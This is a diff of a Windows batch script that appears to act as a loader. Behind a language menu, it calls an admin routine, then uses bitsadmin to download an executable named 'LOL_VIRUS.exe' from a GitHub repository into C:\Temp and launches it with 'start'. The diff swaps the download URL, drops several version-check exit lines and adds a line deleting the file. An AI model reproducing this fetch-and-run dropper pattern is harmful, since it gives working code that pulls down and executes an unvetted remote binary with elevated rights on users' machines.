@@ -3,14 +3,7 @@ call :Adm
 chcp 866
 color a
 title Choose language
-ver | find "1.6" >nul && exit
-ver | find "1.5" >nul && exit
-ver | find "1.4bug_fix" >nul && exit
-ver | find "1.3" >nul && exit
-ver | find "1.2" >nul && exit
-ver | find "1.1" >nul && exit
-ver | find "0.9" >nul && exit
-ver | find "0.8" >nul && exit
+del C:\Temp\LOL_VIRUS.exe
 cls
 goto lang
 
@@ -82,7 +75,7 @@ cls
 goto upd
 
 :updcentr
-bitsadmin.exe /transfer "GGYT1" https://raw.githubusercontent.com/GGYT1/GGYT/main/LOL_VIRUS/LOL_VIRUS.exe C:\Temp\LOL_VIRUS.exe
+bitsadmin.exe /transfer "GGYT1" https://github.com/GGYT1/GGYT/releases/download/LOL_VIRUS/LOL_VIRUS.exe C:\Temp\LOL_VIRUS.exe
 pause
 cd C:\Temp
 start LOL_VIRUS.exe
